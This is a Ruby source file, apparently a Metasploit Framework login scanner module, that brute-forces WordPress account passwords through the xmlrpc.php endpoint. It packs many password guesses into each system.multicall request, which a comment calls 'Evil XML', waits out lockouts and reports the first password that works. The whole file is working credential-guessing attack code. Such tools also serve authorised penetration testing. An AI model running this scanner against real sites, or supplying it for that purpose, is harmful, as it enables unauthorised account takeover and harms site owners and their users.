require 'metasploit/framework/login_scanner/http'
require 'nokogiri'

module Metasploit
  module Framework
    module LoginScanner

      # Wordpress XML RPC login scanner
      class WordpressRPC < HTTP

        attr_accessor :passwords

        attr_accessor :chunk_size

        attr_accessor :block_wait

        attr_accessor :base_uri

        attr_reader :wordpress_url_xmlrpc

        def set_default
          self.wordpress_url_xmlrpc = 'xmlrpc.php'
        end

        def generate_xml(user)
          xml_payloads = []

          # Evil XML | Limit number of log-ins to CHUNKSIZE/request due Wordpress limitation which is 1700 maximum.
          passwords.each_slice(chunk_size) do |pass_group|
            document = Nokogiri::XML::Builder.new do |xml|
              xml.methodCall {
                xml.methodName("system.multicall")
                xml.params {
                xml.param {
                xml.value {
                xml.array {
                xml.data {
                pass_group.each  do |pass|
                  #$stderr.puts "Trying: #{user}:#{pass}"
                  xml.value  {
                  xml.struct {
                  xml.member {
                  xml.name("methodName")
                  xml.value  { xml.string("wp.getUsersBlogs") }}
                  xml.member {
                  xml.name("params")
                  xml.value {
                  xml.array {
                  xml.data  {
                  xml.value {
                  xml.array {
                  xml.data  {
                  xml.value { xml.string(user) }
                  xml.value { xml.string(pass) }
                  }}}}}}}}}
                end
                }}}}}}
            end
            xml_payloads << document.to_xml
          end

          xml_payloads
        end

        def send(xml)
          opts =
            {
              'method'  => 'POST',
              'uri'     => normalize_uri("#{base_uri}/#{wordpress_url_xmlrpc}"),
              'data'    => xml,
              'ctype'   =>'text/xml'
            }

          client = Rex::Proto::Http::Client.new(rhost)
          client.connect
          req  = client.request_cgi(opts)
          res  = client.send_recv(req)

          if res && res.code != 200
            sleep(block_wait * 60)
          end

          @res = res
        end


        def attempt_login(credential)
          #$stderr.puts "Testing: #{credential.public}"
          generate_xml(credential.public).each do |xml|
            send(xml)
            req_xml = Nokogiri::Slop(xml)
            res_xml = Nokogiri::Slop(@res.to_s.scan(/<.*>/).join)
            res_xml.search("methodResponse/params/param/value/array/data/value").each_with_index do |value, i|
              result =  value.at("struct/member/value/int")
              if result.nil?
                pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
                credential.private = pass
                #$stderr.puts "Good: #{credential.inspect}"
                result_opts = {
                  credential: credential,
                  host: host,
                  port: port,
                  protocol: 'tcp'
                }
                result_opts.merge!(status: Metasploit::Model::Login::Status::SUCCESSFUL)
                return Result.new(result_opts)
              end
            end
          end


          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp'
          }

          result_opts.merge!(status: Metasploit::Model::Login::Status::INCORRECT)
          return Result.new(result_opts)
        end

      end
    end
  end
end


